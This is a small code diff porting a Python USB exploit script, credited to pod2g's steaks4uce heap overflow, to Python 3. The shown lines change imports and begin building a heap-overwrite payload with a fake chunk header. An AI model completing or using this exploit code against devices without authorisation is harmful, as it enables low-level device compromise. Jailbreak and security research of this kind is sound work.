@@ -1,7 +1,5 @@
 # Credit: This file is based on steaks4uce exploit (heap overflow) by pod2g.
 
-from __future__ import print_function
-
 import struct, sys, time
 import usb # pyusb: use 'pip install pyusb' to install this module
 import dfu
@@ -75,7 +73,7 @@ configs = [
 ]
 
 # Pad to length 256 and add heap data for overwrite
-payload = '\x00' * 256 + struct.pack('<14I',
+payload = b'\x00' * 256 + struct.pack('<14I',
               # 1. Allocated chunk to be freed
               # Chunk header: (size 0x8)
         0x84, #   0x00: previous_chunk
